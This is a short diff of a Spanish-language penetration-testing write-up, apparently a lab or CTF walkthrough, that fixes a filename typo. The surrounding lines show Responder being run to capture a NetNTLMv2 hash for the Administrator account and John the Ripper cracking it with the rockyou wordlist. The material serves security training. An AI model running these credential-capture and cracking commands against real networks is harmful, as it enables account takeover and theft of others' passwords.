@@ -57,13 +57,13 @@ sudo responder -I <INTERFAZ_RED>
 
 ```bash
 # Asegurar el formato del hash (evitar saltos de línea)
-echo -n 'Administrator::RESPONDER:...' > hashh.txt
+echo -n 'Administrator::RESPONDER:...' > hash.txt
 
 # Ejecución de descifrado
-john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashh.txt
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 # Visualización de credenciales
-john --show hashh.txt
+john --show hash.txt
 ```
 
 **Credenciales obtenidas:**
